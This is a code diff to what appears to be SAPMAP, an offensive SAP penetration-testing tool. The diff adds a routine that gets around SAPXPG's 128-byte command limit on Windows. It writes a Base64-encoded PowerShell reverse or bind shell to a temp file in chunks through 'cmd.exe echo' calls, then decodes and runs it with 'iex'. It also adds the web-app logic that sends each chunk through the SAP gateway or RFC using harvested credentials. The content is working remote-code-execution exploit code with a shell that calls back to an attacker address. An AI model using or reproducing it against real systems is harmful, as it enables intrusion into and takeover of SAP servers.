@@ -366,6 +366,49 @@ def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
         return "127.0.0.1"
 
 
+def _win_multistep_payload(ps_script: str, display: str) -> dict:
+    """Build a multi-step Windows payload: write PS script to temp file,
+    then execute it.
+
+    EXTPROG is only 128 bytes in the SAPXPG protocol. PowerShell
+    EncodedCommand payloads are ~1100 chars, so they get truncated.
+    Instead, write the Base64-encoded script to a temp file in chunks
+    via multiple 'cmd.exe /C echo ... >> file' calls, then run
+    PowerShell to decode and execute from that file.
+
+    Returns a dict with "steps" (list of command/params dicts) and
+    a final "command"/"params" that is the execute step.
+    """
+    import base64
+    enc = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
+    tmp = r"C:\Windows\Temp\s"
+
+    # Split Base64 into chunks that fit in EXTPROG (128 bytes).
+    # "cmd.exe /C echo CHUNK>>C:\Windows\Temp\s" = ~42 overhead
+    chunk_size = 80
+    chunks = [enc[i:i+chunk_size] for i in range(0, len(enc), chunk_size)]
+
+    steps = []
+    for idx, chunk in enumerate(chunks):
+        redir = ">" if idx == 0 else ">>"
+        steps.append({
+            "command": f"cmd.exe /C echo {chunk}{redir}{tmp}",
+            "params": "",
+        })
+
+    # Final step: decode the Base64 file and execute (118 chars, fits 128)
+    run_cmd = ('powershell -nop -c "iex([Text.Encoding]::Unicode.GetString'
+               "([Convert]::FromBase64String((gc "
+               f"'{tmp}' -Raw).Trim())))\"")
+    assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
+    return {
+        "steps": steps,
+        "command": run_cmd,
+        "params": "",
+        "display": display,
+    }
+
+
 def _generate_payload(os_type: str, ip: str, port: int) -> dict:
     """Generate reverse shell payload based on OS type."""
     is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
@@ -378,13 +421,7 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
               f"$p=$r+'PS '+$(pwd).Path+'> ';"
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
               f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
-        import base64 as _b64
-        enc = _b64.b64encode(ps.encode("utf-16-le")).decode("ascii")
-        return {
-            "command": f"powershell.exe -nop -w hidden -EncodedCommand {enc}",
-            "params": "",
-            "display": f"PowerShell reverse shell → {ip}:{port}",
-        }
+        return _win_multistep_payload(ps, f"PowerShell reverse shell → {ip}:{port}")
     else:
         # SAPXPG splits PARAMS at spaces (execvp argv splitting).
         # With EXTPROG=python3 and PARAMS="-c <code>", SAPXPG produces
@@ -423,17 +460,7 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
               f"$p=$r+'PS '+$(pwd).Path+'> ';"
               f"$t=([text.encoding]::ASCII).GetBytes($p);"
               f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
-        # Use -EncodedCommand (Base64 of UTF-16LE) to avoid SAPXPG
-        # space splitting destroying the PowerShell script.
-        # Put full command in EXTPROG — Windows SAPXPG (old kernels)
-        # treats EXTPROG as the full command line, PARAMS gets mangled.
-        import base64
-        enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
-        return {
-            "command": f"powershell.exe -nop -w hidden -EncodedCommand {enc}",
-            "params": "",
-            "display": f"PowerShell bind shell on target port {port}",
-        }
+        return _win_multistep_payload(ps, f"PowerShell bind shell on port {port}")
     else:
         # Bind shell: listen on target, SAPMAP connects to it.
         # Zero spaces, under 255 chars (SXPG PARAMS limit).
@@ -1435,6 +1462,23 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"{payload['display']}")
                 print(f"    Listening on 0.0.0.0:{shell_port}")
 
+            # Execute pre-steps (e.g. writing script chunks to temp file)
+            pre_steps = payload.get("steps", [])
+            if pre_steps:
+                print(f"[*] {sid}: Writing payload to temp file "
+                      f"({len(pre_steps)} chunks)...")
+                for step in pre_steps:
+                    if method == "gateway":
+                        sapmap_exploit.execute_gw_command(
+                            node, step["command"], step["params"])
+                    else:
+                        creds = node.best_credentials()
+                        if creds:
+                            sapmap_rfc.execute_local_command(
+                                node, step["command"], step["params"],
+                                creds)
+
+            # Execute the main payload command
             if method == "gateway":
                 result = sapmap_exploit.execute_gw_command(
                     node, payload["command"], payload["params"])
